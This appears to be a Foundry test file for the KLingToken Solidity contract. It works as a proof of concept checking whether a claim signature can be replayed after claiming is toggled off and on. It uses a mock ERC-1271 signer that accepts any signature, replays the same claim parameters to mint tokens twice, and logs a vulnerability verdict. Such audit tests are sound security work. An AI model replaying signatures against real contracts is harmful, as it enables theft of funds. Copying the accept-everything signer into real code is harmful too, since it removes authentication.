// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/KLingToken.sol";

contract MockSigner {
    function isValidSignature(bytes32, bytes memory) external pure returns (bytes4) {
        return bytes4(0x1626ba7e); // ERC-1271 magic value
    }
}

contract KLingTokenTest is Test {
    KLingToken token;
    MockSigner mockSigner;
    address owner = address(this);
    address user = address(0x123);
    
    // Fixed fake signature that will pass ERC-1271 validation
    bytes constant FAKE_SIGNATURE = "FAKE_SIGNATURE";

    function setUp() public {
        // Create mock signer that always returns valid signature
        mockSigner = new MockSigner();
        
        // Deploy token with mock signer
        token = new KLingToken(address(mockSigner));
        
        // Transfer ownership to test contract if needed
        if (token.owner() != address(this)) {
            vm.prank(token.owner());
            token.transferOwnership(address(this));
        }
    }

    function test_SignatureReuseAfterToggle() public {
        uint256 amount = 100e18;
        
        // 1. Enable claiming
        token.claimStateUpdate(true);
        
        // 2. Create claim parameters for user
        uint256 slot = 0;
        uint256 deadline = block.timestamp + 1 days;
        bytes memory params = abi.encode(
            FAKE_SIGNATURE,
            user,
            amount,
            slot,
            deadline
        );

        // 3. First claim - should succeed
        vm.prank(user);
        token.claim(params);
        
        // Verify tokens were minted to user
        assertEq(token.balanceOf(user), amount);

        // 4. Toggle claimState off and back on
        token.claimStateUpdate(false);
        token.claimStateUpdate(true);
        
        // Prepare second claim params
        bytes memory params2 = abi.encode(
            FAKE_SIGNATURE,
            user,
            amount,
            slot,
            deadline
        );
        
        // ====== DIFFERENTIAL VALIDATION ======
        console.log("--- BEFORE-Trigger Second Claim ---");
        uint256 balanceBefore = token.balanceOf(user);
        console.log("User balance before claim:", balanceBefore);
        
        console.log("--- Trigger Second Claim ---");
        vm.prank(user);
        try token.claim(params2) {
            console.log("Claim tx executed without revert");
        } catch {
            console.log("Claim tx reverted!");
        }
        
        console.log("--- AFTER-Trigger Second Claim ---");
        uint256 balanceAfter = token.balanceOf(user);
        console.log("User balance after claim:", balanceAfter);
        
        // Calculate state change
        uint256 balanceDifference = balanceAfter - balanceBefore;
        bool signatureWasReset = balanceAfter >= balanceBefore + amount;
        
        console.log("Balance change:", balanceDifference);
        console.log("Signature reuse verdict:", 
            signatureWasReset ? "RESET -> VULNERABILITY" : "PERSISTED -> NO VULNERABILITY"
        );
        
        // Final verdict logic
        if (balanceAfter >= balanceBefore + amount) {
            console.log("Vulnerability Exists: Signature state was reset after claimState toggle");
        } else {
            console.log("Vulnerability not Exist: Signature state persisted across claimState toggle");
        }
        // ====== END DIFFERENTIAL VALIDATION ======
    }
}